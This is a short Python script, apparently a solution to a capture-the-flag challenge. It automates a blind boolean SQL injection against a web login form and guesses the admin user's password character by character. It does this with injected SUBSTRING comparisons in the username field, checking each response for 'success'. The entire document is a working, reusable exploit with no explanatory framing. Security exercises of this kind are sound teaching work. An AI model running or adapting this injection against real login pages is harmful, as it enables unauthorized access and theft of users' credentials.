import requests

url = "http://chals.syssec.dk:8080//login"

def send_request(username, password):    
    formdata = {'username': username, 'password': password}
    x = requests.post(url, data = formdata)
    return x

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}"

flag = ""
for i in range(1,40):
    for char in alphabet:
        injection = "' OR SUBSTRING((SELECT password FROM users WHERE username = 'admin'), " + str(i) + ", 1) = '" + char + "' --"
        x = send_request(injection, "")
        # print(x.text)
        if "success" in x.text:
            flag += char
            break
    print(flag)

print(flag)
